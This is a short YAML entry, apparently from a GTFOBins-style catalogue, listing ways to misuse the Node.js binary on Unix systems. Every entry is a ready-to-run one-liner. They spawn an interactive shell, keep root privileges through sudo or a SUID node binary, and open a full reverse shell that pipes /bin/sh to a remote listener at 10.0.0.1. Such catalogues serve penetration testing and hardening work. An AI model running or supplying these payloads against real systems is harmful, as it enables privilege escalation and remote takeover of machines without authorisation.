---
functions:
  exec-interactive:
    - code: |
        node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
  sudo-enabled:
    - code: |
        sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
  suid-enabled:
    - code: |
        ./node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});'
  reverse-shell:
    - description: Run `nc -l -p 12345` to receive the shell on the other end.
      code: |
        export RHOST=10.0.0.1
        export RPORT=12345
        node -e 'sh = require("child_process").spawn("/bin/sh");
        client = new require("net").Socket();
        client.connect(process.env.RPORT, process.env.RHOST, function () {
          client.pipe(sh.stdin);
          sh.stdout.pipe(client);
          sh.stderr.pipe(client);
        });'
---